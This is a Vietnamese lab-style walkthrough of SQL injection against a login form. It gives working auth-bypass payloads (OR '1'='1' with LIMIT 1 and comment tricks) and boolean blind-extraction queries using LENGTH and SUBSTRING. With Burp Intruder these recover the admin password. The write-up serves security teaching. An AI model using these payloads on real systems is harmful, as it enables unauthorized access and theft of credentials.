# Khai thác SQLi trong trang web
- **Mục tiêu: Đăng nhập vào user `admin`**
- Đầu tiên, thử đăng nhập tên `admin` với mật khẩu bất kỳ

![image](https://github.com/user-attachments/assets/53a67e53-59e9-4032-84b2-e53f7d9e3ea4)

- Từ đây, ta khai thác được là có bảng `acc`, cột `username` và cột `password` có trong truy vấn
- Thử với SQLi `' OR '1'='1' --`

username: `admin' OR '1'='1' --`

password: `aaaa`

![image](https://github.com/user-attachments/assets/6b591f87-8bd3-4642-a437-1c2d39c530d4)

- Có vẻ lỗi là do thừa 1 dấu ' ở trong phần password
- Để xử lí vấn đề này thì ta có thể thêm dấu cách vào cuối chuối username mình nhập, tức là thêm dấu cách sau `--` -> `-- `. Giải thích cho vấn đề này thì nó là 1 sự yêu cầu cơ bản của MariaDB (hay MySQL idk :>>>>) khi sau dấu `--` phải là 1 dấu cách, hơn nữa nếu nhìn cả câu truy vấn thì nó sẽ là `--'` thì MariaDB nó không hiểu đây là 1 comment mà là 1 phần của chuỗi, vậy nên cuối phần password nó tự thêm 1 dấu ' nữa để đóng
- Tức là nó coi đoạn `--' AND password = 'aaaa` là 1 chuỗi và bắt đầu 1 cái ' sau đấy thì phải có 1 ' nữa để kết thúc. Xảy ra vấn đề thừa dấu '.
- Cách 2: có thể thay `--` thành `#` thì nó sẽ hiểu phần sau là comment

![image](https://github.com/user-attachments/assets/e6df0a95-6684-4e40-8f02-bec21c19d881)

- Truy vấn: `SELECT * FROM acc WHERE username = 'admin' OR '1'='1' -- ' AND password = 'aaaa'`
- Nghĩa là điều kiện `username = 'admin' OR TRUE`. Thì tất nhiên là đúng, nhưng nó sẽ lấy tất cả các hàng có trong database thành 8 hàng, nên không đăng nhập được, vậy ta cần chỉ là 1 hàng duy nhất. Thêm điều kiện `LIMIT 1` vào là lấy được 1 hàng.

![image](https://github.com/user-attachments/assets/d88a8a57-1263-4609-8679-6007a57fc792)

- Đã đăng nhập được, những có vẻ username ko phải là `admin` mà nó là: `admin' OR '1'='1' LIMIT 1--`
- Thử xem trong BurpSuite

![image](https://github.com/user-attachments/assets/4debcf9d-18d2-4dfc-b553-f5f27a4c41b8)

- Xem thì thấy, khi đăng nhập được vào và có sự điều hướng đến `trangchu.php` thì trong reponse sẽ có 1 phần thông báo lại cái truy vấn SQL và số hàng.
- Vậy là có 2 điều kiện cần tuân thủ là: **username** là `admin`, và **số hàng** là `1`
- Để xử lý vấn đề này ta có 2 cách:
  + 1 là tiếp tục sửa truy vấn
  + 2 là dò tìm mật khẩu của `admin`
 
------------------------------------------------------------------------

# Cách 1:
- Vừa rồi ta vừa thử với payload là:
  + username: `admin' OR '1'='1' LIMIT 1 -- `
  + password: `bất kỳ`
- Kết quả: Đăng nhập với username `admin' OR '1' = '1' LIMIT 1 --`
- Vậy để đăng nhập được username là `admin` thì chắc chắn chỉ được nhập `admin` 

=> Phải sửa truy vấn từ mật khẩu
- `SELECT * FROM acc WHERE username = 'admin' AND password = 'aaaa'`
- Ở đây ta hay biến để điều kiện thành `username = 'admin' AND TRUE` vậy thì như username nhập lúc nãy, ta dùng `' OR '1'='1' LIMIT 1 -- `
=> `SELECT * FROM acc WHERE username = 'admin' AND password = 'aaaa' OR '1'='1' LIMIT 1 -- '`

![image](https://github.com/user-attachments/assets/8b5d0420-f375-46cc-acc7-037d1190fdcb)

- AND Yesssss, ta thành công vào đc user `admin` và được chuyển hướng đến `admin.php` 

---------------------------------------------------------------------------
# Cách 2: 
- Như đã nói ở trên thì ta cần điều kiện **số hàng trong bảng phải bằng 1** ta có thể thay `OR` thành `AND`
=> `admin' AND '1'='1' -- `
- Như vậy ta cũng có thể đăng nhập vào nhưng sẽ ko đến được `admin.php` mà nó sẽ chuyển hướng đến `trangchu.php` vì tên username không phải `admin`.
- Nhưng với điều kiện này thì chắc chắn số hàng sẽ bằng 1, vậy ra tiếp tục sửa đổi phần điều kiện `'1'='1'` để tìm ra được password của `admin`.
- Dùng `(SELECT 'a' FROM acc WHERE username = 'admin' AND LENGTH(password) > 1) = 'a'` để thay thế.
- Giải thích: Với điều kiện `username = 'admin'` và `độ dài của pass lớn hơn 1` nếu cả 2 cùng đúng thì ký tự `'a'` sẽ được lấy ra để so sánh với `'a'`,và chắc chắn nó TRUE.
- Vậy:
  + username: `admin' AND (SELECT 'a' FROM acc WHERE username = 'admin' AND LENGTH(password) > 1) = 'a' -- `
  + pass: tùy ý
 
![image](https://github.com/user-attachments/assets/5ab483fa-65d0-4f44-b241-f6691c9f6b3a)

- Số hàng = 1 => Đúng là username `admin` có password lớn hơn 1. Tiếp tục thử

![image](https://github.com/user-attachments/assets/1e67985b-5aae-4415-80b1-47b99d02ec59)

- Đến khi lớn hơn 8 thì số hàng = 0 => password này có 8 ký tự.
- Khi đã biết số lượng ký tự rồi, chúng ta sẽ thử tìm từng chữ cái một. Ta có thể sử dụng truy vấn sau:
- `admin' AND (SELECT SUBSTRING(password,1,1) FROM acc WHERE username = 'admin') = 'a' -- `
- Cũng tương tự với cấu trúc `'1'='1'` trên thì ở đây kiểm tra xem ký tự đầu tiên trong password có phải là `'a'` hay không? Nếu đúng, số hàng sẽ = 1. Nếu sai, số hàng sẽ = 0, ta thay đổi ký tự `'a'` ở bên ngoài kia thành ký tự tiếp theo

![image](https://github.com/user-attachments/assets/da2bd7dd-78a5-4fb3-adf2-756f96a8acb2)

- Và ký tự đầu tiên đúng là `'a'`
- Thử với ký tự thứ 2 của Password

> [!NOTE]
> Sau khi có `so hang: 1` tức là cũng có nghĩa nó đã đc chuyển hướng tới `trangchu.php`. Ta cần bấm 1 lần `login` sau đấy thì `logout` ra, nếu không kể từ sau đấy mỗi request sẽ đều bị điều hướng đến `trangchu.php` và không có được thông tin gì cả.

- Gửi request đấy đến Intruder để brute force

![image](https://github.com/user-attachments/assets/a8a375c9-2ca5-4060-a2b2-7fcde05b0323)

- Tìm ký tự thứ 2 trong password:

![image](https://github.com/user-attachments/assets/7456cb07-3218-4100-8bf2-3f26412c7796)

- Tại đây ta thấy, chỗ chữ `d` thì nó bắt đầu có status 302, và xem response thì có `so hang: 1`
=> Vậy có thể hiểu là với status 200 thì là request gửi đi sai, nên nó vẫn ở trang login và hiện thông báo sai. Còn status 302 thì là đã đúng và chuyển hướng nó đến `trangchu.php`, tức là ký tự đầu tiên nhận lỗi 302 là ký tự đúng của password, còn các lỗi 302 sau đấy là do đã chuyển hướng trang nên nó báo vậy =D.
- Tương tự như vậy với các ký tự tiếp theo

![image](https://github.com/user-attachments/assets/b54ab4b3-d19b-405e-9f17-8d79ff50b636)

- Ký tự 3: m
- Ký tự 4: i
- Ký tự 5: n
- Ký tự 6: 1
- Ký tự 7: 2
- Ký tự 8: 3

=> Vậy password của `admin` là: `admin123`

![image](https://github.com/user-attachments/assets/9bbe9d33-794a-4936-abc4-40ea2f3cc48e)





